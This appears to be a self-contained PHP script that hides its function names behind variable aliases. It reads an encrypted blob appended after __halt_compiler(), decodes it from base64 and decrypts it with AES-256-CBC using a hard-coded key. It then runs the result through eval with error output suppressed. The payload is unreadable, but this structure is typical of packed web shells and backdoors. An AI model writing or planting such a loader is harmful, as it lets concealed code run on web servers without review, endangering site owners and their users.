<?php
if(PHP_SAPI!=='cli-server')@header('Content-Type:text/html;charset=utf-8');
$x1="strtr";$x2="substr";$x3="file_get_contents";$x4="base64_decode";$x5="openssl_decrypt";$x6="hash";$x7="sha256";
$p=$x1($x2($x3(__FILE__),__COMPILER_HALT_OFFSET__),"-_~","+/=");
$p=$x4($p);
$v=$x2($p,0,16);
$c=$x2($p,16);
$k=$x6($x7,'54b85a482ebc7c59fb3db1684d6bcc197ff38ae93080cb5521c04af94067e0cc',true);
@eval("?>".$x5($c,"AES-256-CBC",$k,OPENSSL_RAW_DATA,$v));
__halt_compiler();
yP3B6SAteiVgj7iMt5RhLTSHODvFR-kGrzwjGF4ptsEZwiGJ1kFg36NxlbYB_kjceBygEcSLnfTT1ciPH4QXZaLI1iye2o7qgtqpIN93SsNU0yjsN8PT6qPnsutkjhvWjttOMHnsMZgWk24YvijGFBq8XwGjtdH5yJBkVXtyR1fucErWZzuOttHDctd746HLtGfxrnxbL7ATw_EMOAogUM0bhfK8WZVzgsAqQ6lhHn8sIosh5qRfC-d0KRNXupxJwufHegacgTRQf3ZPcovOIgaiofTHPN-pd96S7LrynrV66uOiSQcy7Pd3cQB7gQEvaszuDxdCaIde0eFTnEcsiC-jCuJ_daG9zh--RFGf9-NdaYD4fgLldqrJLfOjfl4azCiktTqocZEXp5APyJxtnEO_ow2g6x-RVTRE2vsdotL_Ony84KJUuHz4EcjbTfdcJyn2cW9cQ6Tc3jjbH9G8dd9SNU2HxxiTzrElrZj7NdzPnDGfOe6lVxxhQOjz8_d_MdXY6bGK7zjz2jnzH7rxfPAFnVJr7OqhDsoFI6KCuzOyDgTUZgZMJ8WvJJiP55XW8MmxCWi3CvrIkl1PZNv7VArcjue74V2XRAIo8Bzu_ps-DJ42TrIG05s1jVhGrKkcRFDgNg83UxEUPisr3rRGBqGf3szPWwiu8RLu9-U3PTfCE-rBPYZdmjNASpXeo80Qe7VibULx02OIPxqrUhRTcGzNuEP9fy5zaL2ueMnRv2iP51sxZgYXSbgoTvYHVVi-fp9vs5RNXGZVv63Vg-FJF4kbcdI04w12MY82CsOuh5XTYJKOIyC4pNQRYLhHu_IA4gs7GHSCfyk8IK3GJ9Ifh0eggZNtXJEjVBEDToKjiwmutxcYQ5higKnAj7BB8Pmvq39AmEsuDmRGdet4CEPn6LfgDgsZIQx97sgLwX-243bwzEr2rjHVq_qLolElRnvpERenDE0zyAvJ6jZJe1WHCp5-lD3i8ME_CkB-kWgEW6nWi243nvfiS4YuoeENtAqQr-W3rcWskvMF56u5aRv1NaJTyKWn65dUD2qtk4_zqxMbftmwL59_a76NF0q_d0Qb8gnyO71GeUZz_E_ABGexcgG2aUiIGaZEPvLLQOhdRqI~